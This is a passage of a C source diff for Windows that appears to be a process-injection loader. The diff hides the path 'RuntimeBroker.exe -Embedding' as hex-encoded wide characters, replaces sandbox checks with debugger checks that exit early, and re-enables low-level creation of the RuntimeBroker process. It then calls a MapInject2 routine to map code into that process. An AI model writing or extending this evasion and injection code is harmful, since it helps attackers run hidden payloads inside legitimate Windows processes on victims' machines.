+        myprintf("close failed : 0x%X \n", state);
+    }
+    myprintf("closed all hands \n");
+    return TRUE;
+
+
+
+}
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+
+
+wchar_t path[] = { 0x005C, 0x003F, 0x003F, 0x005C, 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032, 0x005C, 0x0052, 0x0075, 0x006E, 0x0074, 0x0069, 0x006D, 0x0065, 0x0042, 0x0072, 0x006F, 0x006B, 0x0065, 0x0072, 0x002E, 0x0065, 0x0078, 0x0065
+};
+//wchar_t path2[] = L"\\??\\C:\\Windows\\System32\\calc.exe";
+wchar_t command_line[] = { 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032, 0x005C, 0x0052, 0x0075, 0x006E, 0x0074, 0x0069, 0x006D, 0x0065, 0x0042, 0x0072, 0x006F, 0x006B, 0x0065, 0x0072, 0x002E, 0x0065, 0x0078, 0x0065, 0x0020, 0x002D, 0x0045, 0x006D, 0x0062, 0x0065, 0x0064, 0x0064, 0x0069, 0x006E, 0x0067, 0x0020
+};
+
+wchar_t current_dir[] = { 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032
+};
 
 int main() {
-    if (isSandboxed()) {
-        myprintf("No sandbox detected, continuing execution...\n");
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
         return 1;
     }
-	myprintf("hello there !\n ");
+    if (ChekDebug()) {
+        return -1;
+    }
+    //myprintf("hello there !\n ");
     InitializeNTCONFIG();
+
     BOOL isit =  InitSyscakk();
     if (!isit) {
-        myprintf("\nFailed to initialize bokemon \n");
+        //myprintf("\nFailed to initialize bokemon \n");
     }
     PVOID sLocation = NULL;
-    if (isSandboxed()) {
-        myprintf("No sandbox detected, continuing execution...\n");
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
         return 1;
     }
-    HANDLE hProcess = (HANDLE)-1;
+    HANDLE hProcess =NULL;
     HANDLE hThread = NULL;
 
-    /*if (!CreateProcLowLevel( (PWSTR)path, (PWSTR)command_line , (PWSTR)current_dir , &hProcess , &hThread)) {
+    if (!CreateProcLowLevel( (PWSTR)path, (PWSTR)command_line , (PWSTR)current_dir , &hProcess , &hThread)) {
         myprintf("\nfailed to create koko \n");
         return -1;
-    }*/
-    /*if (!hThread) {
+    }
+    if (!hThread) {
         myprintf("hThr is nukk \n");
         return -1;
-    }*/
-    //myprintf("hthr is 0x%p \n" , hThread);
+    }
 
-    if (isSandboxed()) {
-        myprintf("No sandbox detected, continuing execution...\n");
+    myprintf("hthr is 0x%p \n" , hThread);
+
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
         return 1;
     }
-    BOOL state = MapInject(hProcess , hThread , &sLocation );
+    BOOL state = MapInject2(hProcess , hThread , &sLocation );
     
     // get the pid 
     // pass it to RemoteMapInject 
